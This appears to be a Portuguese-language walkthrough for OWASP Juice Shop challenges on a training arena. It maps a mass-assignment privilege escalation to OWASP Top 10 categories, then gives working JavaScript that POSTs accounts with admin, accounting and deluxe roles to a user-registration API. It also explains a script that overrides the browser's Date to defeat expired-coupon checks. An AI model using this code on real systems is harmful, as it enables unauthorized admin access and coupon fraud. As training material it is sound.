O que voc√™ descreveu (enviar um **POST** para criar contas com pap√©is elevados como `admin` ou `accounting`) se encaixa em v√°rias categorias do **OWASP Top 10**, dependendo de como o sistema est√° vulner√°vel:

### üîπ 1. **Broken Access Control (A01:2021)**

* O sistema **n√£o deveria permitir** que um usu√°rio comum defina o campo `"role": "admin"` ou `"role": "accounting"` na requisi√ß√£o.
* Se isso √© aceito, significa que **o controle de acesso est√° quebrado**, pois o back-end n√£o valida se quem est√° criando a conta tem permiss√£o para atribuir pap√©is administrativos.

---

### üîπ 2. **Insecure Design (A04:2021)**

* O fato de o **papel do usu√°rio (`role`) ser definido pelo pr√≥prio cliente** mostra que o sistema foi **mal projetado**.
* √â um exemplo cl√°ssico de **falta de valida√ß√£o no servidor** e de confiar demais no que vem do lado do cliente.

---

### üîπ 3. **Security Misconfiguration (A05:2021)**

* Se a API n√£o exige autentica√ß√£o para criar usu√°rios ou **n√£o possui regras de neg√≥cios adequadas**, tamb√©m √© considerado **m√° configura√ß√£o de seguran√ßa**.

---

üìå **Resumo:**
O ataque √© um **Broken Access Control** porque **permite que qualquer pessoa crie contas com privil√©gios elevados alterando o campo `role`** na requisi√ß√£o.

Na pr√°tica, isso √© conhecido como **Privilege Escalation (Escalada de Privil√©gios)** via **Mass Assignment (atribui√ß√£o indevida de campos)**.

üëâ No **Juice Shop (OWASP)**, esse desafio geralmente est√° relacionado ao **"Privilege Escalation"** e ao **"Improper Access Control"**.

```js
const users = [
  {
    email: "admin@mail",
    role: "admin",
    password: "admin1",
    passwordRepeat: "admin1",
    securityQuestion: {
      id: 1,
      question: "Your eldest siblings middle name?",
      createdAt: "2020-08-13T14:12:54.775Z",
      updatedAt: "2020-08-13T14:12:54.775Z"
    },
    securityAnswer: "Whatever"
  },
  {
    email: "admin1@mail",
    role: "accounting",
    password: "admin1",
    passwordRepeat: "admin1",
    securityQuestion: {
      id: 1,
      question: "Your eldest siblings middle name?",
      createdAt: "2020-08-13T14:12:54.775Z",
      updatedAt: "2020-08-13T14:12:54.775Z"
    },
    securityAnswer: "Whatever"
  },

    {
    email: "admin2@mail",
    role: "deluxe",
    password: "admin1",
    passwordRepeat: "admin1",
    securityQuestion: {
      id: 1,
      question: "Your eldest siblings middle name?",
      createdAt: "2020-08-13T14:12:54.775Z",
      updatedAt: "2020-08-13T14:12:54.775Z"
    },
    securityAnswer: "Whatever"
  }
];

users.forEach(user => {
  fetch("https://arena.cecyber.com/api/Users/", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "accept": "application/json, text/plain, */*"
    },
    body: JSON.stringify(user)
  })
    .then(res => res.json())
    .then(data => console.log("Resposta:", data))
    .catch(err => console.error("Erro:", err));
});
``` 

## üß© Estrutura e fun√ß√£o do c√≥digo

```js
// Salva a Date original antes de sobrescrever
window.OriginalDate = window.Date;
```

‚úÖ Aqui estamos **guardando a implementa√ß√£o original** da classe `Date` na vari√°vel `window.OriginalDate`.
Isso √© importante para que voc√™ possa restaur√°-la depois, ou reutiliz√°-la dentro da nova vers√£o.

---

```js
// Agora sobrescreve Date com comportamento personalizado
Date = class extends window.OriginalDate {
```

‚úÖ Aqui, voc√™ est√° **substituindo o objeto global `Date`** por uma nova classe que herda de `OriginalDate`.
Ou seja: toda vez que `new Date()` for usado no c√≥digo da aplica√ß√£o, ele chamar√° **a sua vers√£o modificada**, que finge ser 08/03/2019.

---

```js
  constructor(...args) {
    if (args.length === 0) {
      return new window.OriginalDate(2019, 2, 8); // Mar√ßo = 2
    }
    return new window.OriginalDate(...args);
  }
```

‚úÖ Esta parte **personaliza a constru√ß√£o do objeto `Date`**:

* Se o desenvolvedor usar `new Date()` sem argumentos (pra pegar a data atual), ele **receber√° 08/03/2019**.
* Se passar argumentos (tipo `new Date("2021-01-01")`), o comportamento segue normal.

üß† Observa√ß√£o: **mar√ßo √© o m√™s 2** em JavaScript porque os meses v√£o de 0 a 11.

---

```js
  static now() {
    return new window.OriginalDate(2019, 2, 8).getTime();
  }
```

‚úÖ Aqui estamos redefinindo o m√©todo est√°tico `Date.now()` para **retornar o timestamp de 08/03/2019** tamb√©m.

---

```js
  static parse(...args) {
    return window.OriginalDate.parse(...args);
  }

  static UTC(...args) {
    return window.OriginalDate.UTC(...args);
  }
```

‚úÖ Esses dois m√©todos (`parse`, `UTC`) s√£o importantes utilit√°rios que precisam funcionar normalmente. Aqui voc√™ **os delega para a implementa√ß√£o original**, sem alterar nada.

```js
// Salva a Date original antes de sobrescrever
window.OriginalDate = window.Date;

// Agora sobrescreve Date com comportamento personalizado
Date = class extends window.OriginalDate {
  constructor(...args) {
    if (args.length === 0) {
      return new window.OriginalDate(2019, 2, 8); // Mar√ßo = 2
    }
    return new window.OriginalDate(...args);
  }

  static now() {
    return new window.OriginalDate(2019, 2, 8).getTime();
  }

  static parse(...args) {
    return window.OriginalDate.parse(...args);
  }

  static UTC(...args) {
    return window.OriginalDate.UTC(...args);
  }
};
```

---

## üìå Em resumo

Esse c√≥digo:

* **Finge para o site que hoje √© 08/03/2019**
* Sem mudar a hora do sistema real
* S√≥ afeta **a aba atual do navegador**
* Serve para **enganar verifica√ß√µes de data** como a de cupons expirados
